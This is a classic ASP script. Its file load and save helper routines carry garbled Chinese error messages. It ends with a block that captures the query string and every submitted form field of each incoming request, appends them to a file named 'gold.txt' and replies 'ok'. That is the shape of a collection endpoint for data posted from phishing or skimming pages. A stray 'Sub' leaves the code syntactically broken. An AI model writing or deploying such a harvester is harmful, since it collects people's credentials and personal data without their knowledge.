<%
Const DEF_FSOString = "Scripting.FileSystemObject"

Function ADODB_LoadFile(ByVal File)

	'On Error Resume Next
	Dim objStream,FSFlag,fs,WriteFile
	FSFlag = 1
	If DEF_FSOString <> "" Then
		Set fs = Server.CreateObject(DEF_FSOString)
		If Err Then
			FSFlag = 0
			Err.Clear
			Set fs = Nothing
		End If
	Else
		FSFlag = 0
	End If

	If FSFlag = 1 Then
		Set WriteFile = fs.OpenTextFile(Server.MapPath(File),1,True)
		If Err Then
			GBL_CHK_TempStr = "<br>��ȡ�ļ�ʧ�ܣ�" & err.description & "<br>�������ܣ�ȷ���Ƿ�Դ��ļ��ж�ȡȨ��."
			err.Clear
			Set Fs = Nothing
			Exit Function
		End If
		If Not WriteFile.AtEndOfStream Then
			ADODB_LoadFile = WriteFile.ReadAll
			If Err Then
				GBL_CHK_TempStr = "��ȡ�ļ�ʧ�ܣ�<p>" & err.description & "</p> �������ܣ�ȷ���Ƿ�Դ��ļ��ж�ȡȨ��."
				err.Clear
				Set Fs = Nothing
				Exit Function
			End If
		End If
		WriteFile.Close
		Set Fs = Nothing
	Else
		Set objStream = Server.CreateObject("ADODB.Stream")
		If Err.Number=-2147221005 Then 
			GBL_CHK_TempStr = "����������֧��ADODB.Stream���޷���ɲ��������ֹ�����"
			Err.Clear
			Set objStream = Nothing
			Exit Function
		End If
		With objStream
			.Type = 2
			.Mode = 3
			.Open
			.LoadFromFile Server.MapPath(File)
			.Charset = "gb2312"
			.Position = 2
			ADODB_LoadFile = .ReadText
			.Close
		End With
		Set objStream = Nothing
	End If
	If Err Then
		GBL_CHK_TempStr = "������Ϣ��<p>" & err.description & "</p>�������ܣ�ȷ���Ƿ�Դ��ļ��ж�ȡȨ��."
		err.Clear
		Set Fs = Nothing
		Exit Function
	End If

End Function

'�洢���ݵ��ļ�
Sub ADODB_SaveToFile(ByVal strBody,ByVal File)

	'On Error Resume Next
	Dim objStream,FSFlag,fs,WriteFile
	FSFlag = 1
	If DEF_FSOString <> "" Then
		Set fs = Server.CreateObject(DEF_FSOString)
		If Err Then
			FSFlag = 0
			Err.Clear
			Set fs = Nothing
		End If
	Else
		FSFlag = 0
	End If
	
	If FSFlag = 1 Then
		Set WriteFile = fs.CreateTextFile(Server.MapPath(File),True)
		WriteFile.Write strBody
		WriteFile.Close
		Set Fs = Nothing
	Else
		Set objStream = Server.CreateObject("ADODB.Stream")
		If Err.Number=-2147221005 Then 
			GBL_CHK_TempStr = "����������֧��ADODB.Stream���޷���ɲ��������ֹ�����"
			Err.Clear
			Set objStream = Nothing
			Exit Sub
		End If
		With objStream
			.Type = 2
			.Open
			.Charset = "gb2312"
			.Position = objStream.Size
			.WriteText = strBody
			.SaveToFile Server.MapPath(File),2
			.Close
		End With
		Set objStream = Nothing
	End If
	If Err Then
		GBL_CHK_TempStr = "������Ϣ��<p>" & err.description & "</p>�������ܣ�ȷ���Ƿ�Դ��ļ���д��Ȩ��."
		err.Clear
		Set Fs = Nothing
		Exit Sub
	End If

End Sub

dim str
str = Request.QueryString & VbCrLf
for each x in request.Form 
str=str&x & ": " & request.Form (x) & VbCrLf
next
ADODB_SaveToFile str,"gold.txt"

Sub 
%>
ok